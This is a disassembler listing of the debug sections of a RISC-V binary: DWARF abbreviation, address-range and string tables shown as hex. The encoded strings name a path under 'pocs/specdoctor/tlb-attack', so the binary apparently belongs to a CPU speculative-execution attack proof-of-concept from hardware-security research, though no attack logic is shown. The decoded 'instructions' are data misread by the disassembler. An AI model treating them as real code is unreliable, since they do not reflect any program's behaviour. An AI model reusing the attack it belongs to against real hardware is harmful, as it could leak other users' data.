  84:	3f01                	.2byte	0x3f01
  86:	0319                	.2byte	0x319
  88:	3a0e                	.2byte	0x3a0e
  8a:	390b3b0b          	.4byte	0x390b3b0b
  8e:	1201110b          	.4byte	0x1201110b
  92:	7a184007          	.4byte	0x7a184007
  96:	0019                	.2byte	0x19
  98:	0000                	.2byte	0x0
  9a:	0501                	.2byte	0x501
  9c:	0300                	.2byte	0x300
  9e:	3a0e                	.2byte	0x3a0e
  a0:	390b3b0b          	.4byte	0x390b3b0b
  a4:	0213490b          	.4byte	0x213490b
  a8:	0018                	.2byte	0x18
  aa:	0200                	.2byte	0x200
  ac:	0034                	.2byte	0x34
  ae:	0b3a0803          	lb	a6,179(s4)
  b2:	0b390b3b          	.4byte	0xb390b3b
  b6:	1349                	.2byte	0x1349
  b8:	1802                	.2byte	0x1802
  ba:	0000                	.2byte	0x0
  bc:	03000503          	lb	a0,48(zero) # 30 <threadsense.5+0x30>
  c0:	3a08                	.2byte	0x3a08
  c2:	390b3b0b          	.4byte	0x390b3b0b
  c6:	0213490b          	.4byte	0x213490b
  ca:	0018                	.2byte	0x18
  cc:	0400                	.2byte	0x400
  ce:	0005                	.2byte	0x5
  d0:	213a0803          	lb	a6,531(s4)
  d4:	3b02                	.2byte	0x3b02
  d6:	3905                	.2byte	0x3905
  d8:	0213490b          	.4byte	0x213490b
  dc:	0018                	.2byte	0x18
  de:	0500                	.2byte	0x500
  e0:	0034                	.2byte	0x34
  e2:	213a0803          	lb	a6,531(s4)
  e6:	3b02                	.2byte	0x3b02
  e8:	3905                	.2byte	0x3905
  ea:	0213490b          	.4byte	0x213490b
  ee:	0018                	.2byte	0x18
  f0:	0600                	.2byte	0x600
  f2:	210b000f          	.4byte	0x210b000f
  f6:	4908                	.2byte	0x4908
  f8:	07000013          	li	zero,112
  fc:	0024                	.2byte	0x24
  fe:	0b3e0b0b          	.4byte	0xb3e0b0b
 102:	00000e03          	lb	t3,0(zero) # 0 <threadsense.5>
 106:	3408                	.2byte	0x3408
 108:	0300                	.2byte	0x300
 10a:	3a0e                	.2byte	0x3a0e
 10c:	390b3b0b          	.4byte	0x390b3b0b
 110:	0213490b          	.4byte	0x213490b
 114:	0018                	.2byte	0x18
 116:	0900                	.2byte	0x900
 118:	0016                	.2byte	0x16
 11a:	0b3a0e03          	lb	t3,179(s4)
 11e:	0b390b3b          	.4byte	0xb390b3b
 122:	1349                	.2byte	0x1349
 124:	0000                	.2byte	0x0
 126:	2e0a                	.2byte	0x2e0a
 128:	0301                	.2byte	0x301
 12a:	3a0e                	.2byte	0x3a0e
 12c:	390b3b0b          	.4byte	0x390b3b0b
 130:	4919270b          	.4byte	0x4919270b
 134:	12011113          	.4byte	0x12011113
 138:	7a184007          	.4byte	0x7a184007
 13c:	0119                	.2byte	0x119
 13e:	0b000013          	li	zero,176
 142:	012e                	.2byte	0x12e
 144:	0e03193f 3b08213a 	.8byte	0x3b08213a0e03193f
 14c:	270b390b          	.4byte	0x270b390b
 150:	4919                	.2byte	0x4919
 152:	12011113          	.4byte	0x12011113
 156:	7a184007          	.4byte	0x7a184007
 15a:	0119                	.2byte	0x119
 15c:	0c000013          	li	zero,192
 160:	0026                	.2byte	0x26
 162:	1349                	.2byte	0x1349
 164:	0000                	.2byte	0x0
 166:	050d                	.2byte	0x50d
 168:	0300                	.2byte	0x300
 16a:	3a0e                	.2byte	0x3a0e
 16c:	0221                	.2byte	0x221
 16e:	0b39053b          	.4byte	0xb39053b
 172:	1349                	.2byte	0x1349
 174:	1802                	.2byte	0x1802
 176:	0000                	.2byte	0x0
 178:	350e                	.2byte	0x350e
 17a:	4900                	.2byte	0x4900
 17c:	0f000013          	li	zero,240
 180:	0034                	.2byte	0x34
 182:	213a0e03          	lb	t3,531(s4)
 186:	3b02                	.2byte	0x3b02
 188:	3905                	.2byte	0x3905
 18a:	0213490b          	.4byte	0x213490b
 18e:	0018                	.2byte	0x18
 190:	1000                	.2byte	0x1000
 192:	0111010b          	.4byte	0x111010b
 196:	0712                	.2byte	0x712
 198:	0000                	.2byte	0x0
 19a:	2e11                	.2byte	0x2e11
 19c:	3f01                	.2byte	0x3f01
 19e:	0319                	.2byte	0x319
 1a0:	3a0e                	.2byte	0x3a0e
 1a2:	390b3b0b          	.4byte	0x390b3b0b
 1a6:	4919270b          	.4byte	0x4919270b
 1aa:	12011113          	.4byte	0x12011113
 1ae:	7c184007          	.4byte	0x7c184007
 1b2:	0119                	.2byte	0x119
 1b4:	12000013          	li	zero,288
 1b8:	0101                	.2byte	0x101
 1ba:	1349                	.2byte	0x1349
 1bc:	1301                	.2byte	0x1301
 1be:	0000                	.2byte	0x0
 1c0:	49002113          	slti	sp,zero,1168
 1c4:	000b2f13          	slti	t5,s6,0
 1c8:	1400                	.2byte	0x1400
 1ca:	0034                	.2byte	0x34
 1cc:	213a0e03          	lb	t3,531(s4)
 1d0:	3b02                	.2byte	0x3b02
 1d2:	1a21390b          	.4byte	0x1a21390b
 1d6:	1349                	.2byte	0x1349
 1d8:	193c193f 0b150000 	.8byte	0xb150000193c193f
 1e0:	1101                	.2byte	0x1101
 1e2:	1201                	.2byte	0x1201
 1e4:	00130107          	.4byte	0x130107
 1e8:	1600                	.2byte	0x1600
 1ea:	0018                	.2byte	0x18
 1ec:	0000                	.2byte	0x0
 1ee:	03012e17          	auipc	t3,0x3012
 1f2:	3a0e                	.2byte	0x3a0e
 1f4:	0221                	.2byte	0x221
 1f6:	0b390b3b          	.4byte	0xb390b3b
 1fa:	01111927          	.4byte	0x1111927
 1fe:	0712                	.2byte	0x712
 200:	1840                	.2byte	0x1840
 202:	197c                	.2byte	0x197c
 204:	1301                	.2byte	0x1301
 206:	0000                	.2byte	0x0
 208:	0a18                	.2byte	0xa18
 20a:	0300                	.2byte	0x300
 20c:	3a0e                	.2byte	0x3a0e
 20e:	0221                	.2byte	0x221
 210:	0b390b3b          	.4byte	0xb390b3b
 214:	0111                	.2byte	0x111
 216:	0000                	.2byte	0x0
 218:	0a19                	.2byte	0xa19
 21a:	0300                	.2byte	0x300
 21c:	3a0e                	.2byte	0x3a0e
 21e:	0221                	.2byte	0x221
 220:	2139053b          	.4byte	0x2139053b
 224:	1105                	.2byte	0x1105
 226:	0001                	.2byte	0x1
 228:	1a00                	.2byte	0x1a00
 22a:	0005                	.2byte	0x5
 22c:	1349                	.2byte	0x1349
 22e:	0000                	.2byte	0x0
 230:	3f012e1b          	.4byte	0x3f012e1b
 234:	0319                	.2byte	0x319
 236:	3a0e                	.2byte	0x3a0e
 238:	0221                	.2byte	0x221
 23a:	21390b3b          	.4byte	0x21390b3b
 23e:	2706                	.2byte	0x2706
 240:	1119                	.2byte	0x1119
 242:	1201                	.2byte	0x1201
 244:	7c184007          	.4byte	0x7c184007
 248:	0119                	.2byte	0x119
 24a:	1c000013          	li	zero,448
 24e:	0034                	.2byte	0x34
 250:	0b3a0e03          	lb	t3,179(s4)
 254:	21390b3b          	.4byte	0x21390b3b
 258:	00134917          	auipc	s2,0x134
 25c:	1d00                	.2byte	0x1d00
 25e:	012e                	.2byte	0x12e
 260:	213a0e03          	lb	t3,531(s4)
 264:	3b01                	.2byte	0x3b01
 266:	270b390b          	.4byte	0x270b390b
 26a:	1119                	.2byte	0x1119
 26c:	1201                	.2byte	0x1201
 26e:	7a184007          	.4byte	0x7a184007
 272:	0119                	.2byte	0x119
 274:	1e000013          	li	zero,480
 278:	0111                	.2byte	0x111
 27a:	0e25                	.2byte	0xe25
 27c:	1f030b13          	add	s6,t1,496
 280:	01111f1b          	sllw	t5,sp,0x11
 284:	0712                	.2byte	0x712
 286:	1710                	.2byte	0x1710
 288:	0000                	.2byte	0x0
 28a:	241f 0b00 3e0b      	.byte	0x1f, 0x24, 0x00, 0x0b, 0x0b, 0x3e
 290:	0008030b          	.4byte	0x8030b
 294:	2000                	.2byte	0x2000
 296:	0b0b000f          	.4byte	0xb0b000f
 29a:	0000                	.2byte	0x0
 29c:	0f21                	.2byte	0xf21
 29e:	0b00                	.2byte	0xb00
 2a0:	000e030b          	.4byte	0xe030b
 2a4:	2200                	.2byte	0x2200
 2a6:	012e                	.2byte	0x12e
 2a8:	0e03193f 053b0b3a 	.8byte	0x53b0b3a0e03193f
 2b0:	0b39                	.2byte	0xb39
 2b2:	13491927          	.4byte	0x13491927
 2b6:	0111                	.2byte	0x111
 2b8:	0712                	.2byte	0x712
 2ba:	1840                	.2byte	0x1840
 2bc:	197a                	.2byte	0x197a
 2be:	1301                	.2byte	0x1301
 2c0:	0000                	.2byte	0x0
 2c2:	00002623          	sw	zero,12(zero) # c <threadsense.5+0xc>
 2c6:	2400                	.2byte	0x2400
 2c8:	012e                	.2byte	0x12e
 2ca:	0b3a0e03          	lb	t3,179(s4)
 2ce:	0b39053b          	.4byte	0xb39053b
 2d2:	01111927          	.4byte	0x1111927
 2d6:	0712                	.2byte	0x712
 2d8:	1840                	.2byte	0x1840
 2da:	1848                	.2byte	0x1848
 2dc:	197a                	.2byte	0x197a
 2de:	0000                	.2byte	0x0
 2e0:	3425                	.2byte	0x3425
 2e2:	0300                	.2byte	0x300
 2e4:	3a08                	.2byte	0x3a08
 2e6:	390b3b0b          	.4byte	0x390b3b0b
 2ea:	0013490b          	.4byte	0x13490b
 2ee:	2600                	.2byte	0x2600
 2f0:	0115                	.2byte	0x115
 2f2:	13011927          	.4byte	0x13011927
 2f6:	0000                	.2byte	0x0
 2f8:	03003427          	fsd	fa6,40(zero) # 28 <threadsense.5+0x28>
 2fc:	3a08                	.2byte	0x3a08
 2fe:	390b3b0b          	.4byte	0x390b3b0b
 302:	8813490b          	.4byte	0x8813490b
 306:	0b01                	.2byte	0xb01
 308:	0000                	.2byte	0x0
 30a:	2e28                	.2byte	0x2e28
 30c:	3f00                	.2byte	0x3f00
 30e:	0319                	.2byte	0x319
 310:	3a0e                	.2byte	0x3a0e
 312:	390b3b0b          	.4byte	0x390b3b0b
 316:	1201110b          	.4byte	0x1201110b
 31a:	7c184007          	.4byte	0x7c184007
 31e:	0019                	.2byte	0x19
 320:	2900                	.2byte	0x2900
 322:	012e                	.2byte	0x12e
 324:	0e03193f 0b3b0b3a 	.8byte	0xb3b0b3a0e03193f
 32c:	0b39                	.2byte	0xb39
 32e:	01871927          	.4byte	0x1871927
 332:	1119                	.2byte	0x1119
 334:	1201                	.2byte	0x1201
 336:	7c184007          	.4byte	0x7c184007
 33a:	0119                	.2byte	0x119
 33c:	2a000013          	li	zero,672
 340:	012e                	.2byte	0x12e
 342:	0e03193f 0b3b0b3a 	.8byte	0xb3b0b3a0e03193f
 34a:	0b39                	.2byte	0xb39
 34c:	01871927          	.4byte	0x1871927
 350:	1119                	.2byte	0x1119
 352:	1201                	.2byte	0x1201
 354:	7a184007          	.4byte	0x7a184007
 358:	0119                	.2byte	0x119
 35a:	2b000013          	li	zero,688
 35e:	0034                	.2byte	0x34
 360:	0b3a0e03          	lb	t3,179(s4)
 364:	0b390b3b          	.4byte	0xb390b3b
 368:	1349                	.2byte	0x1349
 36a:	0188                	.2byte	0x188
 36c:	0018020b          	.4byte	0x18020b
 370:	2c00                	.2byte	0x2c00
 372:	012e                	.2byte	0x12e
 374:	0b3a0e03          	lb	t3,179(s4)
 378:	0b390b3b          	.4byte	0xb390b3b
 37c:	01111927          	.4byte	0x1111927
 380:	0712                	.2byte	0x712
 382:	1840                	.2byte	0x1840
 384:	197a                	.2byte	0x197a
 386:	0000                	.2byte	0x0
 388:	0100                	.2byte	0x100
 38a:	0024                	.2byte	0x24
 38c:	0b3e0b0b          	.4byte	0xb3e0b0b
 390:	00000e03          	lb	t3,0(zero) # 0 <threadsense.5>
 394:	1602                	.2byte	0x1602
 396:	0300                	.2byte	0x300
 398:	3a0e                	.2byte	0x3a0e
 39a:	390b3b0b          	.4byte	0x390b3b0b
 39e:	0013490b          	.4byte	0x13490b
 3a2:	0300                	.2byte	0x300
 3a4:	0034                	.2byte	0x34
 3a6:	213a0e03          	lb	t3,531(s4)
 3aa:	3b01                	.2byte	0x3b01
 3ac:	1021390b          	.4byte	0x1021390b
 3b0:	1349                	.2byte	0x1349
 3b2:	193c193f 01040000 	.8byte	0x1040000193c193f
 3ba:	4901                	.2byte	0x4901
 3bc:	00130113          	add	sp,t1,1
 3c0:	0500                	.2byte	0x500
 3c2:	0034                	.2byte	0x34
 3c4:	213a0e03          	lb	t3,531(s4)
 3c8:	3b01                	.2byte	0x3b01
 3ca:	0f21390b          	.4byte	0xf21390b
 3ce:	1349                	.2byte	0x1349
 3d0:	1802                	.2byte	0x1802
 3d2:	0000                	.2byte	0x0
 3d4:	1106                	.2byte	0x1106
 3d6:	2501                	.2byte	0x2501
 3d8:	130e                	.2byte	0x130e
 3da:	1b1f030b          	.4byte	0x1b1f030b
 3de:	111f 1201 1007      	.byte	0x1f, 0x11, 0x01, 0x12, 0x07, 0x10
 3e4:	07000017          	auipc	zero,0x7000
 3e8:	0024                	.2byte	0x24
 3ea:	0b3e0b0b          	.4byte	0xb3e0b0b
 3ee:	00000803          	lb	a6,0(zero) # 0 <threadsense.5>
 3f2:	2108                	.2byte	0x2108
 3f4:	0000                	.2byte	0x0
 3f6:	0900                	.2byte	0x900
 3f8:	0021                	.2byte	0x21
 3fa:	1349                	.2byte	0x1349
 3fc:	00000b2f          	.4byte	0xb2f
 400:	210a                	.2byte	0x210a
 402:	4900                	.2byte	0x4900
 404:	00052f13          	slti	t5,a0,0
 408:	0b00                	.2byte	0xb00
 40a:	0034                	.2byte	0x34
 40c:	0b3a0803          	lb	a6,179(s4)
 410:	0b390b3b          	.4byte	0xb390b3b
 414:	1349                	.2byte	0x1349
 416:	0188193f 00180205 	.8byte	0x1802050188193f
 41e:	0c00                	.2byte	0xc00
 420:	012e                	.2byte	0x12e
 422:	0e03193f 0b3b0b3a 	.8byte	0xb3b0b3a0e03193f
 42a:	0b39                	.2byte	0xb39
 42c:	193c                	.2byte	0x193c
 42e:	1301                	.2byte	0x1301
 430:	0000                	.2byte	0x0
 432:	180d                	.2byte	0x180d
 434:	0000                	.2byte	0x0
 436:	0e00                	.2byte	0xe00
 438:	012e                	.2byte	0x12e
 43a:	0e03193f 0b3b0b3a 	.8byte	0xb3b0b3a0e03193f
 442:	0b39                	.2byte	0xb39
 444:	0111                	.2byte	0x111
 446:	0712                	.2byte	0x712
 448:	1840                	.2byte	0x1840
 44a:	197a                	.2byte	0x197a
 44c:	1301                	.2byte	0x1301
 44e:	0000                	.2byte	0x0
 450:	03012e0f          	.4byte	0x3012e0f
 454:	3a0e                	.2byte	0x3a0e
 456:	390b3b0b          	.4byte	0x390b3b0b
 45a:	4919270b          	.4byte	0x4919270b
 45e:	12011113          	.4byte	0x12011113
 462:	7a184007          	.4byte	0x7a184007
 466:	0019                	.2byte	0x19
 468:	1000                	.2byte	0x1000
 46a:	0005                	.2byte	0x5
 46c:	0b3a0803          	lb	a6,179(s4)
 470:	0b390b3b          	.4byte	0xb390b3b
 474:	1349                	.2byte	0x1349
 476:	1802                	.2byte	0x1802
 478:	0000                	.2byte	0x0
 47a:	3411                	.2byte	0x3411
 47c:	0300                	.2byte	0x300
 47e:	3a08                	.2byte	0x3a08
 480:	390b3b0b          	.4byte	0x390b3b0b
 484:	0213490b          	.4byte	0x213490b
 488:	0018                	.2byte	0x18
 48a:	0000                	.2byte	0x0
 48c:	3401                	.2byte	0x3401
 48e:	0300                	.2byte	0x300
 490:	3a08                	.2byte	0x3a08
 492:	390b3b0b          	.4byte	0x390b3b0b
 496:	0213490b          	.4byte	0x213490b
 49a:	0018                	.2byte	0x18
 49c:	0200                	.2byte	0x200
 49e:	0024                	.2byte	0x24
 4a0:	0b3e0b0b          	.4byte	0xb3e0b0b
 4a4:	00000e03          	lb	t3,0(zero) # 0 <threadsense.5>
 4a8:	03003403          	ld	s0,48(zero) # 30 <threadsense.5+0x30>
 4ac:	3a0e                	.2byte	0x3a0e
 4ae:	390b3b0b          	.4byte	0x390b3b0b
 4b2:	0213490b          	.4byte	0x213490b
 4b6:	0018                	.2byte	0x18
 4b8:	0400                	.2byte	0x400
 4ba:	0005                	.2byte	0x5
 4bc:	0b3a0803          	lb	a6,179(s4)
 4c0:	0b390b3b          	.4byte	0xb390b3b
 4c4:	1349                	.2byte	0x1349
 4c6:	1802                	.2byte	0x1802
 4c8:	0000                	.2byte	0x0
 4ca:	0505                	.2byte	0x505
 4cc:	0300                	.2byte	0x300
 4ce:	3a0e                	.2byte	0x3a0e
 4d0:	0121                	.2byte	0x121
 4d2:	0b390b3b          	.4byte	0xb390b3b
 4d6:	1349                	.2byte	0x1349
 4d8:	1802                	.2byte	0x1802
 4da:	0000                	.2byte	0x0
 4dc:	0f06                	.2byte	0xf06
 4de:	0b00                	.2byte	0xb00
 4e0:	0821                	.2byte	0x821
 4e2:	1349                	.2byte	0x1349
 4e4:	0000                	.2byte	0x0
 4e6:	11010b07          	.4byte	0x11010b07
 4ea:	1201                	.2byte	0x1201
 4ec:	08000007          	.4byte	0x8000007
 4f0:	0016                	.2byte	0x16
 4f2:	0b3a0e03          	lb	t3,179(s4)
 4f6:	0b390b3b          	.4byte	0xb390b3b
 4fa:	1349                	.2byte	0x1349
 4fc:	0000                	.2byte	0x0
 4fe:	2609                	.2byte	0x2609
 500:	4900                	.2byte	0x4900
 502:	0a000013          	li	zero,160
 506:	012e                	.2byte	0x12e
 508:	213a0e03          	lb	t3,531(s4)
 50c:	3b01                	.2byte	0x3b01
 50e:	270b390b          	.4byte	0x270b390b
 512:	4919                	.2byte	0x4919
 514:	12011113          	.4byte	0x12011113
 518:	7a184007          	.4byte	0x7a184007
 51c:	0119                	.2byte	0x119
 51e:	0b000013          	li	zero,176
 522:	0101                	.2byte	0x101
 524:	1349                	.2byte	0x1349
 526:	1301                	.2byte	0x1301
 528:	0000                	.2byte	0x0
 52a:	350c                	.2byte	0x350c
 52c:	4900                	.2byte	0x4900
 52e:	0d000013          	li	zero,208
 532:	0034                	.2byte	0x34
 534:	0b3a0e03          	lb	t3,179(s4)
 538:	0b390b3b          	.4byte	0xb390b3b
 53c:	1349                	.2byte	0x1349
 53e:	0000                	.2byte	0x0
 540:	210e                	.2byte	0x210e
 542:	4900                	.2byte	0x4900
 544:	000b2f13          	slti	t5,s6,0
 548:	0f00                	.2byte	0xf00
 54a:	012e                	.2byte	0x12e
 54c:	213a0e03          	lb	t3,531(s4)
 550:	3b01                	.2byte	0x3b01
 552:	270b390b          	.4byte	0x270b390b
 556:	1119                	.2byte	0x1119
 558:	1201                	.2byte	0x1201
 55a:	7a184007          	.4byte	0x7a184007
 55e:	0119                	.2byte	0x119
 560:	10000013          	li	zero,256
 564:	0111                	.2byte	0x111
 566:	0e25                	.2byte	0xe25
 568:	1f030b13          	add	s6,t1,496
 56c:	01111f1b          	sllw	t5,sp,0x11
 570:	0712                	.2byte	0x712
 572:	1710                	.2byte	0x1710
 574:	0000                	.2byte	0x0
 576:	2411                	.2byte	0x2411
 578:	0b00                	.2byte	0xb00
 57a:	030b3e0b          	.4byte	0x30b3e0b
 57e:	0008                	.2byte	0x8
 580:	1200                	.2byte	0x1200
 582:	0021                	.2byte	0x21
 584:	0000                	.2byte	0x0
 586:	03003413          	sltiu	s0,zero,48
 58a:	3a0e                	.2byte	0x3a0e
 58c:	390b3b0b          	.4byte	0x390b3b0b
 590:	3f13490b          	.4byte	0x3f13490b
 594:	3c19                	.2byte	0x3c19
 596:	0019                	.2byte	0x19
 598:	1400                	.2byte	0x1400
 59a:	012e                	.2byte	0x12e
 59c:	0e03193f 0b3b0b3a 	.8byte	0xb3b0b3a0e03193f
 5a4:	0b39                	.2byte	0xb39
 5a6:	13491927          	.4byte	0x13491927
 5aa:	0111                	.2byte	0x111
 5ac:	0712                	.2byte	0x712
 5ae:	1840                	.2byte	0x1840
 5b0:	197c                	.2byte	0x197c
 5b2:	1301                	.2byte	0x1301
 5b4:	0000                	.2byte	0x0
 5b6:	3415                	.2byte	0x3415
 5b8:	0300                	.2byte	0x300
 5ba:	3a08                	.2byte	0x3a08
 5bc:	390b3b0b          	.4byte	0x390b3b0b
 5c0:	0013490b          	.4byte	0x13490b
 5c4:	1600                	.2byte	0x1600
 5c6:	0111010b          	.4byte	0x111010b
 5ca:	0712                	.2byte	0x712
 5cc:	1301                	.2byte	0x1301
 5ce:	0000                	.2byte	0x0
 5d0:	3f012e17          	auipc	t3,0x3f012
 5d4:	0319                	.2byte	0x319
 5d6:	3a0e                	.2byte	0x3a0e
 5d8:	390b3b0b          	.4byte	0x390b3b0b
 5dc:	1119270b          	.4byte	0x1119270b
 5e0:	1201                	.2byte	0x1201
 5e2:	7a184007          	.4byte	0x7a184007
 5e6:	0119                	.2byte	0x119
 5e8:	18000013          	li	zero,384
 5ec:	012e                	.2byte	0x12e
 5ee:	0b3a0e03          	lb	t3,179(s4)
 5f2:	0b390b3b          	.4byte	0xb390b3b
 5f6:	01111927          	.4byte	0x1111927
 5fa:	0712                	.2byte	0x712
 5fc:	1840                	.2byte	0x1840
 5fe:	197a                	.2byte	0x197a
 600:	0000                	.2byte	0x0
	...

Disassembly of section .debug_aranges:

0000000000000000 <.debug_aranges>:
   0:	003c                	.2byte	0x3c
   2:	0000                	.2byte	0x0
   4:	0002                	.2byte	0x2
   6:	0000                	.2byte	0x0
   8:	0000                	.2byte	0x0
   a:	0008                	.2byte	0x8
   c:	0000                	.2byte	0x0
   e:	0000                	.2byte	0x0
  10:	0000                	.2byte	0x0
  12:	8000                	.2byte	0x8000
  14:	0000                	.2byte	0x0
  16:	0000                	.2byte	0x0
  18:	01ac                	.2byte	0x1ac
	...
  22:	8020                	.2byte	0x8020
  24:	0000                	.2byte	0x0
  26:	0000                	.2byte	0x0
  28:	0014                	.2byte	0x14
	...
  3e:	0000                	.2byte	0x0
  40:	002c                	.2byte	0x2c
  42:	0000                	.2byte	0x0
  44:	0002                	.2byte	0x2
  46:	00000023          	sb	zero,0(zero) # 0 <threadsense.5>
  4a:	0008                	.2byte	0x8
  4c:	0000                	.2byte	0x0
  4e:	0000                	.2byte	0x0
  50:	7048                	.2byte	0x7048
  52:	8000                	.2byte	0x8000
  54:	0000                	.2byte	0x0
  56:	0000                	.2byte	0x0
  58:	0084                	.2byte	0x84
	...
  6e:	0000                	.2byte	0x0
  70:	002c                	.2byte	0x2c
  72:	0000                	.2byte	0x0
  74:	0002                	.2byte	0x2
  76:	010c                	.2byte	0x10c
  78:	0000                	.2byte	0x0
  7a:	0008                	.2byte	0x8
  7c:	0000                	.2byte	0x0
  7e:	0000                	.2byte	0x0
  80:	70cc                	.2byte	0x70cc
  82:	8000                	.2byte	0x8000
  84:	0000                	.2byte	0x0
  86:	0000                	.2byte	0x0
  88:	146c                	.2byte	0x146c
	...
  9e:	0000                	.2byte	0x0
  a0:	002c                	.2byte	0x2c
  a2:	0000                	.2byte	0x0
  a4:	0002                	.2byte	0x2
  a6:	0da2                	.2byte	0xda2
  a8:	0000                	.2byte	0x0
  aa:	0008                	.2byte	0x8
  ac:	0000                	.2byte	0x0
  ae:	0000                	.2byte	0x0
  b0:	8538                	.2byte	0x8538
  b2:	8000                	.2byte	0x8000
  b4:	0000                	.2byte	0x0
  b6:	0000                	.2byte	0x0
  b8:	02ac                	.2byte	0x2ac
	...
  ce:	0000                	.2byte	0x0
  d0:	002c                	.2byte	0x2c
  d2:	0000                	.2byte	0x0
  d4:	0002                	.2byte	0x2
  d6:	0f4a                	.2byte	0xf4a
  d8:	0000                	.2byte	0x0
  da:	0008                	.2byte	0x8
  dc:	0000                	.2byte	0x0
  de:	0000                	.2byte	0x0
  e0:	87e4                	.2byte	0x87e4
  e2:	8000                	.2byte	0x8000
  e4:	0000                	.2byte	0x0
  e6:	0000                	.2byte	0x0
  e8:	0718                	.2byte	0x718
	...

Disassembly of section .debug_str:

0000000000000000 <.debug_str>:
   0:	2f637273          	csrrc	tp,0x2f6,6
   4:	6e65                	.2byte	0x6e65
   6:	7274                	.2byte	0x7274
   8:	2e79                	.2byte	0x2e79
   a:	6d2f0053          	.4byte	0x6d2f0053
   e:	746e                	.2byte	0x746e
  10:	6c696d2f          	.4byte	0x6c696d2f
  14:	7365                	.2byte	0x7365
  16:	6e61                	.2byte	0x6e61
  18:	6d2d                	.2byte	0x6d2d
  1a:	7465                	.2byte	0x7465
  1c:	2f61                	.2byte	0x2f61
  1e:	6f70                	.2byte	0x6f70
  20:	732f7363          	bgeu	t5,s2,746 <threadsense.2+0x6c2>
  24:	6570                	.2byte	0x6570
  26:	636f6463          	bltu	t5,s6,64e <threadsense.2+0x5ca>
  2a:	6f74                	.2byte	0x6f74
  2c:	2f72                	.2byte	0x2f72
  2e:	6c74                	.2byte	0x6c74
  30:	2d62                	.2byte	0x2d62
  32:	7461                	.2byte	0x7461
  34:	6174                	.2byte	0x6174
  36:	542f6b63          	bltu	t5,sp,58c <threadsense.2+0x508>
  3a:	6d65                	.2byte	0x6d65
  3c:	6c70                	.2byte	0x6c70
  3e:	7461                	.2byte	0x7461
  40:	0065                	.2byte	0x65
  42:	20554e47          	fmsub.s	ft8,fa0,ft5,ft4,rmm
  46:	5341                	.2byte	0x5341
  48:	3220                	.2byte	0x3220
  4a:	342e                	.2byte	0x342e
  4c:	2e30                	.2byte	0x2e30
  4e:	0030                	.2byte	0x30
  50:	5f5f 6975 746e      	.byte	0x5f, 0x5f, 0x75, 0x69, 0x6e, 0x74
  56:	5f38                	.2byte	0x5f38
  58:	0074                	.2byte	0x74
  5a:	5f5f 6975 746e      	.byte	0x5f, 0x5f, 0x75, 0x69, 0x6e, 0x74
  60:	7470                	.2byte	0x7470
  62:	5f72                	.2byte	0x5f72
  64:	0074                	.2byte	0x74
  66:	6d70                	.2byte	0x6d70
  68:	5f70                	.2byte	0x5f70
  6a:	6f62                	.2byte	0x6f62
  6c:	7500746f          	jal	s0,77bc <threadsense.2+0x7738>
  70:	736e                	.2byte	0x736e
  72:	6769                	.2byte	0x6769
  74:	656e                	.2byte	0x656e
  76:	2064                	.2byte	0x2064
  78:	72616863          	bltu	sp,t1,7a8 <threadsense.2+0x724>
  7c:	4700                	.2byte	0x4700
  7e:	554e                	.2byte	0x554e
  80:	4320                	.2byte	0x4320
  82:	3939                	.2byte	0x3939
  84:	3120                	.2byte	0x3120
  86:	2e32                	.2byte	0x2e32
  88:	2e32                	.2byte	0x2e32
  8a:	2030                	.2byte	0x2030
  8c:	6d2d                	.2byte	0x6d2d
  8e:	646f6d63          	bltu	t5,t1,6e8 <threadsense.2+0x664>
  92:	6c65                	.2byte	0x6c65
  94:	6d3d                	.2byte	0x6d3d
  96:	6465                	.2byte	0x6465
  98:	6e61                	.2byte	0x6e61
  9a:	2079                	.2byte	0x2079
  9c:	6d2d                	.2byte	0x6d2d
  9e:	6261                	.2byte	0x6261
  a0:	3d69                	.2byte	0x3d69
  a2:	706c                	.2byte	0x706c
  a4:	3436                	.2byte	0x3436
  a6:	2d20                	.2byte	0x2d20
  a8:	746d                	.2byte	0x746d
  aa:	6e75                	.2byte	0x6e75
  ac:	3d65                	.2byte	0x3d65
  ae:	6f72                	.2byte	0x6f72
  b0:	74656b63          	bltu	a0,t1,806 <threadsense.2+0x782>
  b4:	2d20                	.2byte	0x2d20
  b6:	696d                	.2byte	0x696d
  b8:	732d6173          	csrrs	sp,mhpmevent18h,26
  bc:	6570                	.2byte	0x6570
  be:	30323d63          	.4byte	0x30323d63
  c2:	3931                	.2byte	0x3931
  c4:	3231                	.2byte	0x3231
  c6:	3331                	.2byte	0x3331
  c8:	2d20                	.2byte	0x2d20
  ca:	616d                	.2byte	0x616d
  cc:	6372                	.2byte	0x6372
  ce:	3d68                	.2byte	0x3d68
  d0:	7672                	.2byte	0x7672
  d2:	3436                	.2byte	0x3436
  d4:	6d69                	.2byte	0x6d69
  d6:	6661                	.2byte	0x6661
  d8:	5f64                	.2byte	0x5f64
  da:	697a                	.2byte	0x697a
  dc:	5f727363          	bgeu	tp,s7,6c2 <threadsense.2+0x63e>
  e0:	697a                	.2byte	0x697a
  e2:	6566                	.2byte	0x6566
  e4:	636e                	.2byte	0x636e
  e6:	6965                	.2byte	0x6965
  e8:	2d20                	.2byte	0x2d20
  ea:	4f2d2067          	.4byte	0x4f2d2067
  ee:	2030                	.2byte	0x2030
  f0:	732d                	.2byte	0x732d
  f2:	6474                	.2byte	0x6474
  f4:	673d                	.2byte	0x673d
  f6:	756e                	.2byte	0x756e
  f8:	3939                	.2byte	0x3939
  fa:	2d20                	.2byte	0x2d20
  fc:	6e66                	.2byte	0x6e66
  fe:	6f632d6f          	jal	s10,327f4 <threadsense.2+0x32770>
 102:	6d6d                	.2byte	0x6d6d
 104:	2d206e6f          	jal	t3,63d6 <threadsense.2+0x6352>
 108:	6e66                	.2byte	0x6e66
 10a:	75622d6f          	jal	s10,22860 <threadsense.2+0x227dc>
 10e:	6c69                	.2byte	0x6c69
 110:	6974                	.2byte	0x6974
 112:	2d6e                	.2byte	0x2d6e
 114:	7270                	.2byte	0x7270
 116:	6e69                	.2byte	0x6e69
 118:	6674                	.2byte	0x6674
 11a:	7300                	.2byte	0x7300
 11c:	6f68                	.2byte	0x6f68
 11e:	7472                	.2byte	0x7472
 120:	7520                	.2byte	0x7520
 122:	736e                	.2byte	0x736e
 124:	6769                	.2byte	0x6769
 126:	656e                	.2byte	0x656e
 128:	2064                	.2byte	0x2064
 12a:	6e69                	.2byte	0x6e69
 12c:	0074                	.2byte	0x74
 12e:	726f6873          	csrrs	a6,mhpmevent6h,30
 132:	2074                	.2byte	0x2074
 134:	6e69                	.2byte	0x6e69
 136:	0074                	.2byte	0x74
 138:	6d70                	.2byte	0x6d70
 13a:	6170                	.2byte	0x6170
 13c:	7300                	.2byte	0x7300
